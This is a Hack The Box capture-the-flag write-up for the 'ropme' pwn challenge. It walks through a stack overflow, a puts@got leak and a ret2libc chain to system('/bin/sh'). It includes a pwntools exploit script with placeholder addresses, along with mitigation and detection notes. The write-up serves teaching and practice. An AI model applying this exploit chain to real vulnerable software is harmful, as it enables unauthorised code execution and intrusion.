---
challenge: ropme
type: Pwn
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, rop, ret2libc, got-leak, pwntools]
---

# ropme — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

## TL;DR

- The binary reads input into a stack buffer without checking its length: the overflow reaches `RIP`.
- `checksec`: NX enabled, no canary and **no PIE**, so the binary addresses are fixed and the attack is plain ROP.
- Stage 1: `pop rdi; ret` → `puts@got` → `puts@plt` → `main`, leaking the real `puts` address to compute the libc base.
- Stage 2: with libc resolved, `system("/bin/sh")` through `pop rdi; ret` plus a `ret` for alignment.

## Brief

A 64-bit ELF that reads a line from stdin into a local buffer. There is no canary and the binary is not PIE; NX blocks shellcode on the stack. The goal is to control `RIP` and chain ROP to a shell.

## Recon

```bash
file ropme; checksec --file=ropme
objdump -d ropme | grep -E "<(main|vuln|system|puts)>"
strings -a ropme | grep -E "/bin/sh|flag"
```

`checksec` reports the challenge's exact setup: `Canary: ✘`, `NX: ✓`, `PIE: ✘`, `RelRO: Partial`. Without PIE, `elf.got` and `elf.plt` can be used directly; with NX there is no shellcode, only gadget chains.

## Code analysis

The main function allocates a small buffer and calls the read with a larger size, without validating the result. With no canary, the extra bytes overwrite the saved RBP and the return address: the overflow is direct and deterministic.

## Root cause

The offset to `RIP` is measured with a cyclic pattern. In this binary the frame reserves 0x50 and the return address sits **72 bytes** from the start of the buffer, but always confirm it:

```bash
python3 -c "from pwn import *; print(cyclic(200))" > pat
./ropme < pat
dmesg | tail -3        # RIP = 0x616161...
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

With `gdb` + `pwndbg`: `pattern create 200`, then `pattern offset $rsp` at the crash.

## Local reproduction

- Run the binary with the challenge libc (`ldd ./ropme`) and debug the crash in `gdb`/`pwndbg`.
- Re-check the offset and the leak against the remote service before sending the final exploit.

## Exploitation

The chain has two stages because libc is randomised: `system`'s address is unknown until something leaks.

1. **Leak**: `pop rdi; ret` → address of `puts@got` → `puts@plt` prints the real libc address of `puts` → `main` reads input again.
2. **ret2libc**: `libc.address = puts_leak - libc.symbols['puts']`; then `pop rdi; ret` → `next(libc.search(b'/bin/sh'))` → `libc.symbols['system']`, with an extra `ret` to keep the stack 16-byte aligned.

```bash
ROPgadget --binary ropme | grep -E "pop rdi|: ret$"
objdump -d ropme | grep -E "<(puts|main)@plt>"
```

```python
from pwn import *
context.binary = elf = ELF('./ropme')
libc = ELF('./libc.so.6')          # the one shipped with the challenge
p = process('./ropme')             # or remote('<IP>', <PORT>)

pop_rdi = <POP_RDI>
ret     = <RET>

# stage 1: leak puts@got, then return to main
p.sendline(flat({<offset>: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]}))
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# stage 2: system('/bin/sh')
p.sendline(flat({<offset>: [ret, pop_rdi, next(libc.search(b'/bin/sh')), libc.symbols['system']]}))
p.interactive()
```

## Evidence

- Trimmed output of the key commands; no flags, credentials or tokens.
- Real values live in `private/` and are not published.

## Lessons

- **No PIE + NX** makes the route obvious: ROP with fixed binary addresses and no shellcode.
- **`puts@got` is the canonical leak**: `puts@plt` prints the contents of its own GOT slot and reveals the libc base.
- **`SIGSEGV` before `ret`** → wrong offset; re-measure with the cyclic pattern.
- **`system` does not run** → stack misalignment; add a `ret` before `pop rdi` (classic `movaps` crash).
- **Works locally, fails remotely** → different libc; use the shipped one and recompute with `libc.symbols`.
- **Broken challenge build**: some writeups report having to subtract 64 bytes from the `/bin/sh` pointer to get a remote shell; verify it in `gdb` before assuming.

MITRE: T1203, T1059.

## Mitigations and detection

- Build with `-fstack-protector-strong` and PIE, and bound the read to the real buffer size (`fgets(buf, sizeof buf, stdin)`).
- Detection: repeated process crashes, cyclic patterns in input, and returns into `puts`/`system` outside the normal flow.

## References

- [MITRE T1059](https://attack.mitre.org/techniques/T1059/)
- [MITRE T1203](https://attack.mitre.org/techniques/T1203/)
- [rop-stack](../../knowledge/pwn/rop-stack.md)
